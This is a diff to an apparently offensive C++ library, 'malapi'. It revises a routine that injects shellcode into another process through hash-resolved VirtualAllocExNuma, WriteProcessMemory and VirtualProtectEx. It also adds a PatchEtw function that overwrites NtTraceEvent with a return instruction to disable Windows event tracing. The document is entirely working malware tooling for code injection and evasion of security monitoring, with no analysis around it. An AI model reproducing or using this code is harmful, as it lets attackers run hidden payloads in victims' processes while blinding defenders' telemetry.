@@ -188,14 +188,12 @@ namespace malapi
 		HMODULE kernel32 = NULL;
 		DWORD old_protection = 0;
 
-		// typeVirtualAllocEx VirtualAllocExC = NULL;
 		typeVirtualAllocExNuma VirtualAllocExNumaC = NULL;
 		typeVirtualProtectEx VirtualProtectExC = NULL;
 		typeWriteProcessMemory WriteProcessMemoryC = NULL;
 		typeGetLastError GetLastErrorC = NULL;
 
-		// constexpr ULONG hash_virtualallocex = malapi::HashStringFowlerNollVoVariant1a("VirtualAllocExNuma");
-		constexpr ULONG hash_virtualallocexnuma = malapi::HashStringFowlerNollVoVariant1a("VirtualAllocEx");
+		constexpr ULONG hash_virtualallocexnuma = malapi::HashStringFowlerNollVoVariant1a("VirtualAllocExNuma");
 		constexpr ULONG hash_virtualprotectex = malapi::HashStringFowlerNollVoVariant1a("VirtualProtectEx");
 		constexpr ULONG hash_writeprocessmemory = malapi::HashStringFowlerNollVoVariant1a("WriteProcessMemory");
 		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
@@ -204,7 +202,6 @@ namespace malapi
 		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
 		if (kernel32 == NULL) return NULL;
 
-		// VirtualAllocExC = (typeVirtualAllocEx)malapi::GetProcAddressC(kernel32, hash_virtualallocex);
 		VirtualAllocExNumaC = (typeVirtualAllocExNuma)malapi::GetProcAddressC(kernel32, hash_virtualallocexnuma);
 		VirtualProtectExC = (typeVirtualProtectEx)malapi::GetProcAddressC(kernel32, hash_virtualprotectex);
 		WriteProcessMemoryC = (typeWriteProcessMemory)malapi::GetProcAddressC(kernel32, hash_writeprocessmemory);
@@ -213,22 +210,22 @@ namespace malapi
 		address_ptr = VirtualAllocExNumaC(process_handle, NULL, shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE, 0);
 		if (address_ptr == NULL)
 		{
-			LOG_ERROR("Failed to allocate memory space (Code: %08lX)", GetLastErrorC());
+			LOG_ERROR("Failed to allocate memory space (Code: %016llx)", GetLastErrorC());
 			return NULL;
 		}
-		else LOG_SUCCESS("Address Pointer: 0x%08lX", address_ptr);
+		else LOG_SUCCESS("Address Pointer: %016llx", address_ptr);
 
 		success = WriteProcessMemoryC(process_handle, address_ptr, shellcode, shellcode_size, &bytes_written);
 		if (!success)
 		{
-			LOG_ERROR("Error writing shellcode to memory (Code: %08lX)", GetLastErrorC());
+			LOG_ERROR("Error writing shellcode to memory (Code: %016llx)", GetLastErrorC());
 			return FALSE;
 		}
 		else LOG_SUCCESS("Shellcode written to memory.");
 
 		if (!VirtualProtectExC(process_handle, address_ptr, shellcode_size, PAGE_EXECUTE_READ, &old_protection))
 		{
-			LOG_ERROR("Failed to change protection type (Code: %08lX)", GetLastErrorC());
+			LOG_ERROR("Failed to change protection type (Code: %016llx)", GetLastErrorC());
 			return FALSE;
 		}
 		else LOG_SUCCESS("Protection changed to RX.");
@@ -333,6 +330,44 @@ namespace malapi
 			sizeof(_PROCESS_LOGGING_INFORMATION));
 
 		return NT_SUCCESS(status);
+	}
+
+	//
+	// Patch ETW
+	// https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c
+	//
+	BOOL PatchEtw()
+	{
+		BOOL success = FALSE;
+		HMODULE kernel32 = NULL;
+		HMODULE ntdll = NULL;
+		DWORD old_protection = 0;
+
+#pragma region imports
+		typeVirtualProtectEx VirtualProtectExC = NULL;
+		typeNtTraceEvent NtTraceEventC = NULL;
+
+		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("NTDLL.DLL");
+		constexpr ULONG hash_nttraceevent = HashStringFowlerNollVoVariant1a("NtTraceEvent");
+		constexpr ULONG hash_virtualprotectex = malapi::HashStringFowlerNollVoVariant1a("VirtualProtectEx");
+
+		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
+		ntdll = malapi::GetModuleHandleC(hash_ntdll);
+		if (kernel32 == NULL || ntdll == NULL) return success;
+
+		VirtualProtectExC = (typeVirtualProtectEx)malapi::GetProcAddressC(kernel32, hash_virtualprotectex);
+		NtTraceEventC = (typeNtTraceEvent)malapi::GetProcAddressC(ntdll, hash_nttraceevent);
+
+#pragma endregion
+
+		VirtualProtectExC(0, NtTraceEventC, 1, PAGE_EXECUTE_READWRITE, &old_protection);
+		memcpy(NtTraceEventC, "\xc3", 1);
+		VirtualProtectExC(0, NtTraceEventC, 1, old_protection, &old_protection);
+
+		success = TRUE;
+
+		return success;
 	}
 
 	//
